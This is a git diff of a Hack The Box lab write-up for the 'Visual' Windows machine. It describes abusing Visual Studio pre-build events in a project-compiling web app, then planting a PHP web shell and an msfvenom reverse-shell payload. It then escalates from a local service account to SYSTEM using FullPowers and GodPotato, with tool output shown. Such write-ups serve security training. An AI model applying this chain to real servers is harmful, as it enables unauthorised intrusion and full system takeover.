@@ -1,5 +1,15 @@
 # HTB - Visual
 ### TL;DR
+This is a Windows 2019 server machine running an Apache 2.4.56 server on port 80. A runnning web app recovers visual studio projects from external gits, compiles them and stores them in the server. The web application can be abused leveraging pre events on visual studio project files. Once inside the machine, we can move laterally to a local service user and restore its privileges with fullpowers.exe. Finally, system shell is obtained with god potato.
+
+Keywords: git, visual studio, pre/post events, fullpowers.exe, god potato.
+
+References:
+https://www.oreilly.com/library/view/version-control-with/9781449345037/ch04.html
+https://learn.microsoft.com/es-es/dotnet/core/tools/dotnet-sln
+https://github.com/itm4n/FullPowers
+https://github.com/BeichenDream/GodPotato
+
 
 ### PHASE 1. Service enumeration
 Launch a port scan with `nmap`
@@ -195,7 +205,7 @@ BrokerInfrastructure    LocalSystem
 camsvc                  LocalSystem                  
 CDPSvc                  NT AUTHORITY\LocalService
 ```
-The user is `ApacheHTTPServer`, who is `nt authority\local service`. Copy a `simple-backdoor.php` and a `.exe` msfvenom payload into the webroot folder (download with certutil). Then start a listener and execute the `.exe` payload server side using a browser and the `simple-backdoor.php`. A reverse shell for user `nt authority\local service` is received on the listener.
+The user turns to be `ApacheHTTPServer`, who is `nt authority\local service`. Copy a `simple-backdoor.php` and an `.exe` msfvenom payload into the webroot folder (download with certutil). Then start a listener and execute the `.exe` payload using a browser and the `simple-backdoor.php`. A reverse shell for user `nt authority\local service` is received on the listener.
 Enumerate ApacheHTTPService user's permissions
 ```markdown
 > whoami
@@ -212,7 +222,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeCreateGlobalPrivilege       Create global objects          Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
-It's the same as before, seems we have not progressed so much; however, there is a tool which restores original privileges (including impersonation) to local services account. Download and use `fullpowers.exe` on local service account, verify impersonation privilege is restored aftwerwards.
+It's the same as before, seems we have not progressed so much; however, there is a tool which restores original privileges (including impersonation) to local services account. Download and use `fullpowers.exe` (https://github.com/itm4n/FullPowers) on the local service account shell, verify impersonation privilege is restored aftwerwards.
 ```markdown
 > fp.exe
 [+] Started dummy thread with id 2388
@@ -237,7 +247,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 ```
-Once we have impersonation privilege restored, we can try all range of potatoes. The one working is god potato. We need another msfvenom shell to execute with god potato.
+Once we have impersonation privilege restored, we can try all range of potatoes. The one working is god potato (https://github.com/BeichenDream/GodPotato). We need another msfvenom shell to execute with god potato.
 ```markdown
 > godpotato-net4.exe -cmd "cmd /c shell.exe"
 [*] CombaseModule: 0x140716178145280
@@ -266,7 +276,7 @@ Once we have impersonation privilege restored, we can try all range of potatoes.
 [*] CurrentUser: NT AUTHORITY\SYSTEM
 [*] process start with pid 2932
 ```
-A system shell is received on listener.
+A system shell is received on the listener.
 
 
 
